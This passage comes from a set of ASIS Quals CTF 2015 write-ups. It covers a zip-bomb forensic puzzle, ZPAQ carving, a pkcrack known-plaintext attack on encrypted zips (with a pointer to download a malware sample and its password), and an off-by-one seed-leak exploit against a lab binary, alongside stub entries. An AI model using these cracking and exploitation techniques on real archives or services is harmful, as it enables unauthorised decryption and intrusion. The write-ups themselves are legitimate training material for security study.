Path = 004.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 3
Path = 005.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 4
Path = 006.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 5
Path = 007.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 6
Path = 008.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 7
Path = 009.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 8
Path = 010.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 9
```

Lets extract `013.7z` to find another bomb (I made an alias for the above command, `7zl`):

```bash
$ 7zl 013.7z 
Path = 0001.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 0
Path = 0002.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 1
Path = 0011.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 10
Path = 0012.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 11
Path = 0013.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 12
Path = 0014.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 13
Path = 0015.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 14
Path = 0016.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 15 
Path = 0003.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 2
Path = 0004.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 3
Path = 0005.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 4
Path = 0006.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 5
Path = 0007.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 6
Path = 0008.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 7
Path = 0010.7z Size = 4194304000 Packed Size = 593444 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 0DAFB4B9 Encrypted = - Method = LZMA:24 Block = 9
Path = 0009.7z Size = 4194304000 Packed Size = 596019 Modified = 2015-04-29 20:32:54 Attributes = ....A CRC = 4D60DC32 Encrypted = - Method = LZMA:24 Block = 8
```

Extract the archive with the unique CRC, remove the last archive and rinse and repeat!

```bash
$ 7z x 013.7z 0009.7z && rm 013.7z
$ 7z x 0009.7z 0000007.7z && rm 0009.7z
$ 7z x 0000007.7z 0000000008.7z && rm 0000007.7z
$ 7z x 0000000008.7z bomb_08 && rm 0000000008.7z
$ 7z l bomb_08

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Error: bomb_08: Can not open file as archive

Errors: 1+
$ file bomb_08
bomb_08: data
```

The remaining file `bomb_08` mostly contains of 0-bytes:

```bash
$ hexdump bomb_08 
0000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
*
7d000000 41 53 49 53 7b 66 39 37 34 64 61 33 32 30 33 64
7d000010 31 35 35 38 32 36 39 37 34 66 34 61 36 36 37 33
7d000020 35 61 32 30 62 7d 0a 00 00 00 00 00 00 00 00 00
7d000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
*
fa000000
```

The part beginning at `7d000000` is the flag, which we can print using `strings -a`:

```bash
$ strings -a bomb_08
ASIS{f974da3203d155826974f4a66735a20b}
```

The flag is `ASIS{f974da3203d155826974f4a66735a20b}`!

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/05/12/011233>
* <https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/keka-bomb>
* <http://fadec0d3.blogspot.com/2015/05/asis-ctf-2015-keka-bomb-75.html>
* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-keka-bomb/>
* [Vietnamese](https://babyphd.net/2015/05/asis-quals-ctf-2015-grids-writeup/)
# ASIS Quals CTF 2015: Must See Iran

**Category:** Forensic
**Points:** 200
**Solves:** 3
**Description:**

> Download the [file](http://tasks.asis-ctf.ir/mustseeIran_301f98783057b46085d65a23bfced03e) and find the flag.

[Alternative download](https://mega.nz/#!DFVRmBrS!U8nLBFdmtiefVbFZdLM10sFwzZ_hTW7_srY98OxWL0o)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: My Ped

**Category:** Forensic
**Points:** 175
**Solves:** 18
**Description:**

> What you see in my [ped](http://tasks.asis-ctf.ir/My_Ped_11ceeee7565e3bbd5c9db2c1a791236f) ?

## Write-up

by [reap-](https://github.com/reap-)

We are served an xz compressed binary My_Ped_11ceeee7565e3bbd5c9db2c1a791236f which decompresses to
![1](https://cloud.githubusercontent.com/assets/10586902/7574178/4f02afae-f7f9-11e4-9940-bb1300ef57e5.png)

to find some more details on the file xxd | head was ran
xxd My_Ped_11ceeee7565e3bbd5c9db2c1a791236f~ | head

0000000: 376b 5374 a031 83d3 8cb2 28b0 d37a 5051  7kSt.1....(..zPQ
0000010: 0201 0700 0000 0000 0000 0001 6a44 4332  ............jDC2
0000020: 3031 3530 3530 3830 3630 3231 3763 3030  0150508060217c00
0000030: 3030 3030 3030 3031 0038 206a 4443 0100  00000001.8 jDC..

running a quick scrape of low hanging fruit reveals a few interesting things:
-2 PNG files from a zpaq website http://mattmahoney.net/dc/zpaq.html
-1 PNG file with half the flag
![00000284](https://cloud.githubusercontent.com/assets/10586902/7574335/87bd9d3a-f7fa-11e4-884b-9abe07425dc2.png)
-1 PDF with a writeup of ZPAQ incremental journaling utility

lets sudo apt-get zpaq and see what it yields:
Error: not ZPAQ

that's not nice but also the version is from the stone age that was installed so i visited the site mentioned about, downloaded the source and compiled a newer release.  Low and behold it acctually worked.
![2](https://cloud.githubusercontent.com/assets/10586902/7574479/9c984880-f7fb-11e4-9fd4-dbdb89ed580a.png)
and there are all our carved files plus inside 0001 another zpaq journal (0644).

looking inside the second journal 'archive' if you want to call it that was the following:
![3](https://cloud.githubusercontent.com/assets/10586902/7574577/52aa5d52-f7fc-11e4-8bc0-44c6013caadb.png)
17 entries named flag, and we are missing 17 pieces to our flag.  Perfect is what I thought but ran into errors when i ran zpaq -all extract new.zpaq.

to get around this I created my own journal with just one file to get the format required and painstakingly ripped them apart one by one like so

![4](https://cloud.githubusercontent.com/assets/10586902/7574658/e3a15838-f7fc-11e4-92da-52e7092fea99.png)
insert data here
![6](https://cloud.githubusercontent.com/assets/10586902/7574695/3acd5eb8-f7fd-11e4-9f6e-f3d26e3b964d.png)

once raw data saved in 17 files .zpaq i extracted them to get each piece.

some of the images were broken i'm not sure exactly why but using display allowed me to view what I needed to view, the last 17 chars of the flag.

ASIS{0e9800346489a3ac4f30c45976e325cf}

-reap

## Other write-ups and resources

* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/my-ped)
# ASIS Quals CTF 2015: Zrypt

**Category:** Forensic
**Points:** 200
**Solves:** 19
**Description:**

> Download [file](http://tasks.asis-ctf.ir/zrypt_6a370fc7e33aa5f6a44a2be4999c4966) and find the flag.

[Alternative download](https://mega.nz/#!aAU2mJbQ!USGve99wek6A10RR0ky459TlkG2P1-3yQfRZv4j3Jqw)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-zrypt/>
* <http://www.thice.nl/asis-ctf-2015-write-ups/>

For more information on `pkcrack`, on why this works and for a more detailed write-up, please read the write-ups mentioned above.

We are given a xz compressed pcap traffic dump that we first decompress using `unxz` and then open with `wireshark`.

Looking at the HTTP packets, we see seven GET HTTP requests to the host `a.asis.io`:

* `BOQqupmS`
* `E0frzRAi`
* `EO4qqhn8`
* `EX8UPdUb`
* `VuwP09eM`
* `YupE1RB8`
* `xnCub4eW`

Trying to export the Objects (`File->Export Objects->HTTP...`) did not work in my case (OS X), so I had to manually save them by following the TCP Stream (`Analyze->Follow->TCP Stream`) and then save the packet as a binary data (`Show data as RAW`, then `Save as...`).

We then have seven encrypted zip files given that each contain two other files:

```bash
$ file *
BOQqupmS: Zip archive data, at least v2.0 to extract
E0frzRAi: Zip archive data, at least v2.0 to extract
EO4qqhn8: Zip archive data, at least v2.0 to extract
EX8UPdUb: Zip archive data, at least v2.0 to extract
VuwP09eM: Zip archive data, at least v2.0 to extract
YupE1RB8: Zip archive data, at least v2.0 to extract
xnCub4eW: Zip archive data, at least v2.0 to extract
$ sha256 *
3a4751eaeecd1be4624e378db9ed8dbff55bc290f01ffeab06ec2f90d71dc65c  BOQqupmS
7e55684baa112ed2b053fc351fae1fe8a1c59ea5efe995a80f76ecef60ff2461  E0frzRAi
66a2cc46df3910b6a4c9a234c4fdbefe6ff1473479f5bb09b3e5eb24442aa9f4  EO4qqhn8
8e8576584c5576b968e8f327a99a63b11cc9eaff2dbd7c3dbc2e0cb85ac957bc  EX8UPdUb
7667d3eabaade9d66f0228c7eeda9f41a52c106ee04b0b7af7d9a409648707cc  VuwP09eM
a61c419281ea93dee466e8ac1947fc51be801d28ce776d4162a8b2479f0f6c72  YupE1RB8
f4a6f087f6dc4cde6c6c245f58489cd23d80848de267c7d6319494a61bbf9224  xnCub4eW
$ ll -Sr | awk '{print $9}' | grep -v '\.' | while read line; do [[ ! -z "$line" ]] && zipinfo "$line"; done
Archive:  VuwP09eM   91319 bytes   2 files
-rwxrw-rw-  3.0 unx    90927 BX defN 13-Apr-15 13:50 9Ux)@Zzr1h03PA#p&#u~JWWgUtpF
-rwxrw-rw-  3.0 unx       38 TX stor 13-Apr-15 12:53 flag.txt
2 files, 90965 bytes uncompressed, 90779 bytes compressed:  0.2%
Archive:  EO4qqhn8   293764 bytes   2 files
-rwxrw-rw-  3.0 unx   202671 BX defN 13-Apr-15 13:06 7^&V8S(J63s$K9csDk~xaFRDGK&Z
-rwxrw-rw-  3.0 unx    90927 BX defN 13-Apr-15 13:50 %dQ+skWS84uT#KSKY1uND$v+
2 files, 293598 bytes uncompressed, 293176 bytes compressed:  0.1%
Archive:  YupE1RB8   518532 bytes   2 files
-rwxrw-rw-  3.0 unx   315786 BX defN 13-Apr-15 13:06 e7m1Jy+#%H!%bBD1FvCB)m!JM0gE
-rwxrw-rw-  3.0 unx   202671 BX defN 13-Apr-15 13:06 fU2G8r)1DD2QQ_xNWuclyde#
2 files, 518457 bytes uncompressed, 517944 bytes compressed:  0.1%
Archive:  EX8UPdUb   810609 bytes   2 files
-rwxrw-rw-  3.0 unx   494676 BX defN 13-Apr-15 13:50 7U0(ZB%8AFX8pd!9FN~v1fePI@s
-rwxrw-rw-  3.0 unx   315786 BX defN 13-Apr-15 13:06 l@IqLO0zJkujH0h3Fj#Ztp!m
2 files, 810462 bytes uncompressed, 810024 bytes compressed:  0.1%
Archive:  BOQqupmS   1098688 bytes   2 files
-rwxrw-rw-  3.0 unx   605502 BX defN 13-Apr-15 13:50 JxdIs^43_74nc-1h3WGphjSUGigLPl
-rwxrw-rw-  3.0 unx   494676 BX defN 13-Apr-15 13:50 fIIutQ+18TE0*Odi*XxM
2 files, 1100178 bytes uncompressed, 1098106 bytes compressed:  0.2%
Archive:  E0frzRAi   2372707 bytes   2 files
-rwxrw-rw-  3.0 unx  1793362 BX defN 15-Apr-15 10:29 cohaxOTDL4Iy4sK7DWFU6Mw6
-rwxrw-rw-  3.0 unx   605502 BX defN 13-Apr-15 13:50 Yy#FoK+YmAgM0#4*C2^i+WWA
2 files, 2398864 bytes uncompressed, 2372131 bytes compressed:  1.1%
Archive:  xnCub4eW   4494528 bytes   2 files
-rwxrw-rw-  3.0 unx  2731504 BX defN  8-Apr-15 08:32 317fc6d41e3d0f79f3e9c470cda48f52a7168c6f
-rwxrw-rw-  3.0 unx  1793362 BX defN 15-Apr-15 10:29 2VT&Wb!XJ0dzG7JyvyH-II#J
2 files, 4524866 bytes uncompressed, 4493994 bytes compressed:  0.7%
```

We see some sort of cascade: Out of the two files in each bigger zip, the smaller one is the biggest file in a smaller zip.

This suggests a plain-text attack on zips using tools such as `pkcrack`.

The only requirement is to get a hold of one of the files in the biggest zip.

By searching for the hashsum `317fc6d41e3d0f79f3e9c470cda48f52a7168c6f`, we find [a malware database](http://malwaredb.malekal.com/index.php?hash=317fc6d41e3d0f79f3e9c470cda48f52a7168c6f) that provides the malware with this hashsum for download. (Password is given in the link... `infected`)

We extract the file and confirm the hashsum:

```bash
$ 7z x c0d2dbb60f18f74c239cd17199e74979.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: c0d2dbb60f18f74c239cd17199e74979.zip

file out/c0d2dbb60f18f74c239cd17199e74979
already exists. Overwrite with 
c0d2dbb60f18f74c239cd17199e74979?
(Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y
Extracting  c0d2dbb60f18f74c239cd17199e74979
Enter password (will not be echoed) :


Everything is Ok

Size:       2731504
Compressed: 2725696
$ sha1 out/c0d2dbb60f18f74c239cd17199e74979
317fc6d41e3d0f79f3e9c470cda48f52a7168c6f  out/c0d2dbb60f18f74c239cd17199e74979
```

Now we need to create a zip containing this file in plaintext to use it to crack the encrypted zip containing the encrypted version of this file:

```bash
$ zip xnCub4eW_plain.zip out/c0d2dbb60f18f74c239cd17199e74979 
  adding: out/c0d2dbb60f18f74c239cd17199e74979 (deflated 0%)
$ zipinfo xnCub4eW_plain.zip 
Archive:  xnCub4eW_plain.zip   2725676 bytes   1 file
-rw-r--r--  3.0 unx  2731504 bx defN  8-Apr-15 11:02 out/c0d2dbb60f18f74c239cd17199e74979
1 file, 2731504 bytes uncompressed, 2725454 bytes compressed:  0.2%
```

Now start `pkcrack` with the correct parameters to get the three encryption keys and an decrypted version of the biggest zip:

```bash
$ pkcrack -p out/c0d2dbb60f18f74c239cd17199e74979 -c 317fc6d41e3d0f79f3e9c470cda48f52a7168c6f -P xnCub4eW_plain.zip -d xnCub4eW_decrypted.zip -C xnCub4eW
Files read. Starting stage 1 on Sat Jan  2 21:23:45 2016
Generating 1st generation of possible key2_2725465 values...done.
Found 4194304 possible key2-values.
Now we're trying to reduce these...
Lowest number: 959 values at offset 2722246
Lowest number: 934 values at offset 2722244
[...]
Lowest number: 101 values at offset 2689992
Lowest number: 97 values at offset 2689991
Done. Left with 97 possible Values. bestOffset is 2689991.
Stage 1 completed. Starting stage 2 on Sat Jan  2 21:23:59 2016
Ta-daaaaa! key0=70a8cda4, key1=547222ce, key2=4c7d562e
Probabilistic test succeeded for 35479 bytes.
Ta-daaaaa! key0=70a8cda4, key1=547222ce, key2=4c7d562e
Probabilistic test succeeded for 35479 bytes.
Ta-daaaaa! key0=70a8cda4, key1=547222ce, key2=4c7d562e
Probabilistic test succeeded for 35479 bytes.
Ta-daaaaa! key0=70a8cda4, key1=547222ce, key2=4c7d562e
Probabilistic test succeeded for 35479 bytes.
Ta-daaaaa! key0=70a8cda4, key1=547222ce, key2=4c7d562e
Probabilistic test succeeded for 35479 bytes.
Stage 2 completed. Starting zipdecrypt on Sat Jan  2 21:24:02 2016
Decrypting 317fc6d41e3d0f79f3e9c470cda48f52a7168c6f (ed5e829f7f1c27cbb62e5458)... OK!
Decrypting 2VT&Wb!XJ0dzG7JyvyH-II#J (15b6960191cbc71256147d67)... OK!
Finished on Sat Jan  2 21:24:02 2016
$ zip -d xnCub4eW_decrypted.zip '317fc6d41e3d0f79f3e9c470cda48f52a7168c6f'
deleting: 317fc6d41e3d0f79f3e9c470cda48f52a7168c6f
$ zipinfo xnCub4eW_decrypted.zip 
Archive:  xnCub4eW_decrypted.zip   1768810 bytes   1 file
-rwxrw-rw-  3.0 unx  1793362 bx defN 15-Apr-15 10:29 2VT&Wb!XJ0dzG7JyvyH-II#J
1 file, 1793362 bytes uncompressed, 1768540 bytes compressed:  1.4%
$ 7z x xnCub4eW_decrypted.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: xnCub4eW_decrypted.zip

Extracting  2VT&Wb!XJ0dzG7JyvyH-II#J

Everything is Ok

Size:       1793362
Compressed: 1768810
```

Rinse and repeat the process for each encrypted zip:

```bash
$ pkcrack -p '2VT&Wb!XJ0dzG7JyvyH-II#J' -c 'cohaxOTDL4Iy4sK7DWFU6Mw6' -P xnCub4eW_decrypted.zip -d E0frzRAi_decrypted -C E0frzRAi
Files read. Starting stage 1 on Sat Jan  2 21:34:49 2016
Generating 1st generation of possible key2_1768551 values...done.
Found 4194304 possible key2-values.
Now we're trying to reduce these...
Lowest number: 980 values at offset 1762081
Lowest number: 933 values at offset 1762074
[...]
Lowest number: 101 values at offset 1684821
Lowest number: 96 values at offset 1640087
Done. Left with 96 possible Values. bestOffset is 1640087.
Stage 1 completed. Starting stage 2 on Sat Jan  2 21:35:32 2016
Ta-daaaaa! key0=279cb96e, key1=ed67df2c, key2=3045ab32
Probabilistic test succeeded for 128469 bytes.
Ta-daaaaa! key0=279cb96e, key1=ed67df2c, key2=3045ab32
Probabilistic test succeeded for 128469 bytes.
Ta-daaaaa! key0=279cb96e, key1=ed67df2c, key2=3045ab32
Probabilistic test succeeded for 128469 bytes.
Stage 2 completed. Starting zipdecrypt on Sat Jan  2 21:35:34 2016
Decrypting cohaxOTDL4Iy4sK7DWFU6Mw6 (fac01cd5a743442f46237d67)... OK!
Decrypting Yy#FoK+YmAgM0#4*C2^i+WWA (eded5ebca7181ac782928982)... OK!
Finished on Sat Jan  2 21:35:34 2016
```

Finally, you have all decryption keys:

* 70a8cda4 547222ce 4c7d562e
* 279cb96e ed67df2c 3045ab32
* f790f319 6b813996 18929df1
* f30895b7 fc7cf9d4 9ed67a05
* bb7f9b6f de8e004c 1b6d2cf5
* d912d4a1 03e40028 655847f3
* 1764f2b7 42de2cb6 c3f66d33

And adding to that, you also get the flag:

```bash
$ 7z x VuwP09eM_decrypted.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: decrypted/VuwP09eM_decrypted.zip

Extracting  9Ux)@Zzr1h03PA#p&#u~JWWgUtpF
Extracting  flag.txt

Everything is Ok

Files: 2
Size:       90965
Compressed: 91295
$ cat out/flag.txt && echo
ASIS{b72be7f18502dde0c2ca373ee3c2b03e}
```

The flag is `ASIS{b72be7f18502dde0c2ca373ee3c2b03e}`.
## Other write-ups and resources

* <https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-zrypt/>
* <http://www.thice.nl/asis-ctf-2015-write-ups/>
# ASIS Quals CTF 2015: Grids

**Category:** Programming
**Points:** 300
**Solves:** 34
**Description:**

> In each stage send the maximun size of area that can be covered by given points as a vertex of polygon in 2D.
> 
> nc 217.218.48.84 12433
> 
> mirror 1 : nc 217.218.48.84 12432
> 
> mirror 2 : nc 217.218.48.84 12434
> 
> mirror 2 : nc 217.218.48.84 12429

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/05/11/232642>
* <https://neg9.org/news/2015/5/11/asis-ctf-quals-2015-grids-programming-300-writeup>
* [Indonesian](https://github.com/rentjongteam/write-ups-2014/tree/master/asis-quals-2015/grids)
* [Vietnamese](https://babyphd.net/2015/05/asis-quals-ctf-2015-grids-writeup/)
# ASIS Quals CTF 2015: Auth-ng

**Category:** pwn
**Points:** 225
**Solves:** 21
**Description:**

> Our login manager [system](http://tasks.asis-ctf.ir/authng_fdea212edc2f8e458cef75cbfa4581fa) seems to be pretty secure. you have my word!
>
> nc 217.218.48.87 33007

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Math Sequence

**Category:** pwn
**Points:** 175
**Solves:** 29
**Description:**

> [This](http://tasks.asis-ctf.ir/math_sequence_3a36703d4b1e398b29e522d508cf3828) is our mathematical sequences holder, Could you pwn it?
>
> nc 217.218.48.87 33003

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/asismathsequence/>
# ASIS Quals CTF 2015: Saw this -1

**Category:** pwn
**Points:** 100
**Solves:** 63
**Description:**

> Survive and get the flag!
>
> Note: This [challenge](http://tasks.asis-ctf.ir/sawthis_cdc323fa79278bcd63e91156dd83e91c) contains two flags, one of them is easier to
> fetch, the other is harder. The easier flag will be clearly indicated
> as "Flag 1", the harder flag as "Flag 2". Submit the easier (Flag 1)
> here.
> 
> Server running here:
> nc 87.107.123.3 31337

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://fritzfs.blogspot.com/2015/05/writeup-saw-this-1-asis-ctf-quals-2015.html> (Common understanding)
* <https://www.whitehatters.academy/asis-ctf-quals-2015-saw-this-1/> (Detailed understanding + python solution base)
* <http://blog.tinduong.pw/asis-quals-2015-saw-this-writeup/> (C-Code, IDA decompiled output)
* <http://bruce30262.logdown.com/posts/277024-asis-ctf-2015-quals-saw-this-1> (IDA decompiled output)

### Meta

Keywords:

* Off-By-One (`obo`) for username in input function starting at `0x400B37`
* Pseudo Random Number Generator (`prng`) - seed leak

We are given a xz compressed tar archive containing a x86-64bit stripped ELF for Linux:

```bash
$ unxz < sawthis_cdc323fa79278bcd63e91156dd83e91c | tar xvf -
saw/
saw/ld-linux-x86-64.so.2
saw/libc.so.6
saw/sawthis
$ cd saw/
$ file sawthis 
sawthis: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=e82f3cf2a0a534a51d0ea4010061595050d4be33, stripped
```

Running it:

```bash
$ ./sawthis 
                                                                          
                           ,+,,.,.,,,.,@#                                 
                         ##.....,..,;';,###                               
                         #@:###,,..'#+:,+@##                              
                        @#::,,::,.,,,,,+;;##@                             
                        @#@+'';:;:;;,;++@@#@@                             
                        +@@@::,#++++',,,##@##                             
                          ;@@:.,,,,,,,::.;.                               
                          .++';#+'';,,.##'                                
                          `+++##+'+,.@####+#':`                           
                          '@;;.;,:'#####+++@++##;                         
                       :##@#,..:###+#####@@#####+++                       
                     `####@@#+###@@+#+##@@@@##+#++###`                    
                     @#@#+#@##@@#+####+##@@@@@########;                   
                    ;##@@############@@##@@@@ .######+#@                  
                  :@#@@@@####@#########@##@@#`   @#@#+####                
             .,,:##@@@@@@#########@#######@@#    @'':;#'#++               
        ``...,#@:;@@@@@@; @###@@#######+#@@@#   `........#                
    ,.;':.,,:;@@'+@@@+.  ,##+#@####@###@@+;:,+'+..:..:.:.`                
    ,,;.+,,              ;##@########@.;#@@@@ ;:;';;+;':                  
      `.;:              `###@@######.'#@###@#: `.                         
       ,;     `,,:     +#####@###@.'##########                            
        .,:.```;,#  .@###@@@@@#,,+@@#@@@@#####`                           
               ,,`.:#;#######@@@@########@#@@#`                           
                  .:###'@@@@@@@;##########@#@+                            
                 ######@+@@@@: '###+###@@@@;,                             
              ++####@@@@:@.   @##++#####@@+                               
             +#####@@@@##@   ,@@@####@#@+,                                
            #@##@@@@@:,'+#',` ######@@@@.                                 
           @####@@@# ;;'+#@########@#@@'                                  
          @##@###@.  ,+###`:+@@######@@@                                  
         ###+####@, #####+##+ '#@#####@                                   
        '####@###;,'@@@+,+###@@@#####@@+'                                 
       ;+######@@@+,@@#:'###'@###########+,                               
         `,@@#@@@.  ##+  ####@`@@###'. ###+#                              
         `@#@#+     ### .##@`#@@@@@'.   `@###                             
        ++@####+   ;@#+ ;##++#@@@@@`#@    @##+                            
       @+@'+##@##  ##+  ###'+###+#+``+@    @###                           
      ++@++++###,#.##+  +##@#+++#+++'#+;:.` @+##                 :@@#@@'  
     #+@+'+##### `### ':## @++++++++##+++++++@###+';,`          @#' #`'## 
 ,;+@@#@###+;   #####+### .++'++'++##@,:;+#######++++++++++##++#@+`'# ;#@ 
 @@@@@@#@+#+:`  @@######``,:@######@@@`          `,;+#######+#@@###+#' #@ 
     @@.        '+ # #        @@;`                          `,@@ ;###',## 
     @@,      '+  '#  #`     #+@                             `#@' @# ;#@  
     @@@    ;+    #.   #,   '+#                               @@' #`'#@   
     :@@` ;#`    `#     #; ##@                                 +@@#@@`    
      #@@#`      #+      ###+                                             
       '#@'      #     .##@                                               
         +@@#.  ,#  :+#@'                                                 
            ;@@@@@@@+,                                                    
                                                                          
                                                                          
 _     ___ _____ _____  _______      _____   __ ___   _____  ___ ___  ______ 
| |   |  _|_   _/  ___|| ___ | |    / _ \ \ / // _ \ |  __ \/ _ \|  \/  |  _|
| |   | |_  | | \ `--. | |_/ | |   / /_\ \ V // /_\ \| |  \/ /_\ | .  . | |_ 
| |   |  _| | |  `--. \|  __/| |   |  _  |\ / |  _  || | __|  _  | |\/| |  _|
| |___| |__ | | /\__/ /| |   | |___| | | || | | | | || |_\ | | | | |  | | |__
\_____\___/ \_/ \____/ \_|   \_____\_| |_/\_/ \_| |_/ \____\_| |_\_|  |_\___/
                                                                          
How can I call you? master
Welcome, master!
Choose your lucky number (1-100)! But choose wisely, your life depends on it: 42
I've thought of 13 numbers. If you guess them correctly, you are free!
Number #1: 1
Number #2: 2
Number #3: 3
Number #4: 4
Number #5: 5
Number #6: 6
Number #7: 7
Number #8: 8
Number #9: 9
Number #10: 10
Number #11: 11
Number #12: 12
Number #13: 13
YOU LOST THE GAME! IT'S OVER!$
```

We can provide a username as well as guess a varying amount of numbers.

Decompiling it with `radare2` to see the application flow:

![](./main-seed.png)
![](./fcn-00400c09.png)

PS: You can also decompile it using IDA to get a better C code representation of the binary as done in [this](http://bruce30262.logdown.com/posts/277024-asis-ctf-2015-quals-saw-this-1) or [this writeup](http://blog.tinduong.pw/asis-quals-2015-saw-this-writeup/).

We see the following:

* `main` calls a function at addr. `0x400c09`
* The function at addr. `0x400c09` stores the result of a `rand()` call into BSS at `0x603148`

![](./main-name.png)

* Out username input is processed with the function `0x400b37`, which gets 2 parameters. So the call looks like this: `fcn.400b37(0x603108, 0x40)`

![](./fcn-00400b37.png)

* The function `fcn.400b37` then gets exactly `0x40`==`64` bytes from our input stream and stores it into BSS at addr. `0x603108`

![](./main-srand.png)

* After asking us for a lucky number between `0` and `100`, `srand` is called with out lucky number plus the previous seed generated by seed, seeding future `rand()` calls

![](./main-generate-numbers.png)
![](./fcn-00400bb5.png)

* To determine the amount of random numbers, some random numbers are then generated with a simple algorithm using rand(), an inline assembly `floor` function and some additions/multiplications

![](./main-loop.png)

* After telling us the number of to be guessed random numbers, `main` then steps into a loop:
  * Generate a random number with a similar algorithm
  * Ask the user for the random number

Note that usually calling `rand()` without seed, it is automatically seeded with a value of 1 (see `man 3 rand`). Decompiling it per hand using `radare2` does not yield any `rad()` call before main calls `0x400c09`. However, looking at `ltrace -f ./sawthis`, we clearly can see a `srand(0xb865a929, 0, 8, 1)` call before our first `rand()` call. If you know why, please tell me!

After some thinking, you'll notice that the seed value and our username are very close to each other in BSS:

* `0x603108` username
* `0x603148` seed

We know these facts:

* We can input `0x40` bytes for our username.
* Right after our username begins the `seed` value.
* `printf` then is called on our username address with `%s` as format string for our username.
* `printf` with `%s` stops reading when it gets a null byte `\x00`

This is some sort of off-by-one vulnerability! If we provide a username of length `0x40` with bytes not `\x00`, `printf` also leaks the seed!

All that is left to do is re-implement the custom modified Pseudo Random Number Generator with the saw-this algorithms using `floor`.

I modified the python script from [this writeup](https://www.whitehatters.academy/asis-ctf-quals-2015-saw-this-1/) to make it work on my local machine, producing [this python script solution](./solve.py):

```bash
$ python solve.py 
[+] Opening connection to localhost on port 6666: Done
Flag: ASIS{109096cca8948d1cebee782a11d2472b}
[*] Closed connection to localhost port 6666
```

